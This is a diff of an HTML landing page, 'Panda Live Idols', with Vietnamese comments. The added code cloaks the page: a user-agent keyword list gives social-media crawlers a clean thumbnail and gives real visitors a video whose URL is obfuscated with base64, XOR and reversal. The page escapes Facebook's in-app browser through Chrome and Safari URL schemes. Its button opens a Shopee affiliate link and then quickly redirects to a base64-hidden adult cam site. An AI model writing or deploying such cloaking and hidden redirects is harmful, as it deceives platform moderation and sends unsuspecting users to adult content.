@@ -1,106 +1,158 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Panda Live Idols</title>
-  <style>
-    * {margin:0;padding:0;box-sizing:border-box;}
-    body,html {
-      height:100%;width:100%;
-      font-family: Arial, sans-serif;
-      overflow:hidden;
-    }
-    .bg-video {
-      position: fixed;
-      top:0;left:0;width:100%;height:100%;
-      object-fit: cover;z-index:-1;
-    }
-    .overlay {
-      position: fixed;
-      top:0;left:0;width:100%;height:100%;
-      background: rgba(0,0,0,0.3);
-      display:flex;justify-content:center;align-items:center;
-      flex-direction:column;text-align:center;color:#fff;
-      padding:20px;
-    }
-    .btn {
-      background:#ff3366;color:#fff;
-      border:none;padding:15px 30px;margin-top:20px;
-      font-size:20px;border-radius:50px;
-      cursor:pointer;font-weight:bold;
-      box-shadow:0 4px 15px rgba(0,0,0,0.3);
-      transition: all 0.3s ease;
-    }
-    .btn:hover {background:#ff6699;transform:scale(1.05);}
-    .logo-top-right {
-      position: fixed;top:20px;right:20px;
-      width:120px;z-index:2;
-    }
-    .logo-bottom-left {
-      position: fixed;bottom:20px;left:20px;
-      width:120px;z-index:2;
-    }
-    .logo-bottom-left2 {
-      position: fixed;bottom:20px;left:160px;
-      width:120px;z-index:2;
-    }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+<title>Panda Live Idols</title>
+
+<!-- Open Graph cho bot -->
+<meta property="og:url" content="https://pandalive-co-kr.github.io/panda-live-idols/" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Panda Live Idols" />
+<meta property="og:description" content="Xem video mới nhất của Panda Live Idols" />
+<meta property="og:image" content="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+
+<style>
+html, body { margin:0; padding:0; height:100%; background:#000; }
+.video-container{ position:relative; width:100%; height:100%; overflow:hidden; }
+.video-container video{ width:100%; height:100%; object-fit:cover; background:#000; }
+.top-logo-right{ position:absolute; top:10px; right:10px; z-index:2000; max-width:150px; }
+.top-logo-left{ position:absolute; top:10px; left:10px; z-index:2000; max-width:150px; }
+.bottom-logo-left{ position:absolute; bottom:10px; left:10px; z-index:2000; max-width:120px; }
+.overlay{ position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); z-index:1000; }
+.cta{ display:flex; align-items:center; gap:8px; background:rgba(0,17,61,0.85); color:#fff;
+      border:none; border-radius:8px; padding:10px 18px; font-size:16px; cursor:pointer; }
+.cta img{ width:24px; height:24px; }
+@media (max-width:768px){
+  .overlay{ top:auto; bottom:320px; transform:translateX(-50%); }
+  .top-logo-left, .top-logo-right{ max-width:100px; }
+  .bottom-logo-left{ max-width:90px; }
+}
+#thumbnail{ display:none; }
+</style>
 </head>
 <body>
-  <!-- Video nền -->
-  <video autoplay muted loop playsinline class="bg-video">
-    <source src="video.mp4" type="video/mp4">
-  </video>
 
-  <!-- Overlay -->
+<!-- Thumbnail cho bot -->
+<div id="thumbnail">
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail sạch" style="width:100%; height:auto;">
+</div>
+
+<!-- Nội dung cho user -->
+<div id="real-content" class="video-container" style="display:none;">
+  <video id="main-video" autoplay muted loop playsinline preload="auto"
+         poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook.jpg" webkit-playsinline></video>
+
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number Logo" class="top-logo-left" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class Logo" class="top-logo-right" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ Logo" class="bottom-logo-left" />
+
   <div class="overlay">
-    <h1>Welcome to Panda Live Idols</h1>
-    <button id="ctaBtn" class="btn">Xem Ngay</button>
+    <button class="cta" id="ctaBtn">
+      <img src="https://pandalive-co-kr.github.io/panda-live-idols/logo.png" alt="Panda Logo" />
+      Panda Live Idols
+    </button>
   </div>
+</div>
 
-  <!-- Logo -->
-  <img src="panda_class.png" alt="Panda Class" class="logo-top-right">
-  <img src="kbj_logo.jpg" alt="KBJ Logo" class="logo-bottom-left">
-  <img src="panda_number.jpg" alt="Panda Number" class="logo-bottom-left2">
+<script>
+// --- Hàm phụ ---
+function xorDecode(str, key) {
+  let res = '';
+  for (let i = 0; i < str.length; i++) {
+    res += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+  }
+  return res;
+}
+function reverseString(s) { return s.split('').reverse().join(''); }
 
-  <script>
-    // Link 18+ mã hóa base64
-    const link18_b64 = "aHR0cHM6Ly9wYW5kYWxpdmUtY28ta3IuZ2l0aHViLmlvL3BhbmRhLWxpd mUtaWRvbHMv";
-    
-    function isFacebookInApp() {
-      const ua = navigator.userAgent || navigator.vendor;
-      return (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
+// --- Mã hóa video URL ---
+const enc3_b64 = "ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
+const xorKey = "PandaKey2025";
+
+// --- Mã hóa link 18+ ---
+const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";
+
+// --- Phát hiện bot ---
+function isBot() {
+  const ua = (navigator.userAgent || "").toLowerCase();
+  const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
+  return keywords.some(k => ua.includes(k)) || navigator.webdriver;
+}
+
+// --- Phát hiện Facebook App WebView trên iOS / Android ---
+function isFacebookApp() {
+  const ua = navigator.userAgent || "";
+  return /FBAN|FBAV/i.test(ua);
+}
+
+function isIOS() {
+  return /iPad|iPhone|iPod/i.test(navigator.userAgent);
+}
+
+function isAndroid() {
+  return /Android/i.test(navigator.userAgent);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  const thumbnail = document.getElementById('thumbnail');
+  const real = document.getElementById('real-content');
+  const vid = document.getElementById('main-video');
+
+  if (isBot()) {
+    thumbnail.style.display = 'block';
+    real.style.display = 'none';
+    return;
+  }
+
+  // --- Decode video URL và gán trực tiếp ---
+  try {
+    const raw = atob(enc3_b64);
+    const step = xorDecode(raw, xorKey);
+    const videoURL = reverseString(step);
+
+    thumbnail.style.display = 'none';
+    real.style.display = 'block';
+    vid.src = videoURL;
+    vid.play().catch(()=>{});
+
+  } catch (err) {
+    thumbnail.style.display = 'block';
+    real.style.display = 'none';
+  }
+
+  // --- Nút CTA ---
+  document.getElementById('ctaBtn').addEventListener('click', function(e){
+    e.preventDefault();
+
+    // Nếu đang trong FB App → mở Chrome/Safari
+    if (isFacebookApp()) {
+      let landingURL = window.location.href; // trang hiện tại
+      if (isAndroid()) {
+        window.location.href = "intent://" + landingURL.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
+      } else if (isIOS()) {
+        // Ưu tiên mở Google Chrome nếu có
+        const chromeURL = "googlechrome://" + landingURL.replace(/^https?:\/\//, '');
+        window.location.href = chromeURL;
+
+        // Nếu không có Chrome → fallback sang Safari
+        setTimeout(() => {
+          window.location.href = landingURL; 
+        }, 500);
+      }
+      return; // dừng, để Chrome/Safari xử lý tiếp
     }
 
-    function reopenInBrowser() {
-      // URL sạch không có fbclid
-      const cleanUrl = window.location.origin + window.location.pathname;
-
-      if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-        // iOS: buộc mở bằng Safari
-        window.open(cleanUrl, "_blank");
-      } else {
-        // Android: buộc mở Chrome
-        window.location.href = "intent://" + cleanUrl.replace(/^https?:\/\//, '') +
-          "#Intent;scheme=https;package=com.android.chrome;end";
-      }
-    }
-
-    document.getElementById('ctaBtn').addEventListener('click', function(){
-      if (isFacebookInApp()) {
-        reopenInBrowser();
-        return;
-      }
-      // Nút Shopee
-      window.open("https://s.shopee.vn/30dchvC74f", "_blank");
-      // Sau 120ms chuyển sang link 18+
-      setTimeout(() => {
-        const link18 = atob(link18_b64);
-        window.location.href = link18;
-      }, 120);
-    });
-  </script>
+    // Ngoài FB App thì chạy logic cũ
+    window.open("https://s.shopee.vn/30dchvC74f", "_blank");
+    setTimeout(() => {
+      const link18 = atob(link18_b64);
+      window.location.href = link18;
+    }, 120);
+  });
+});
+</script>
 </body>
 </html>
-
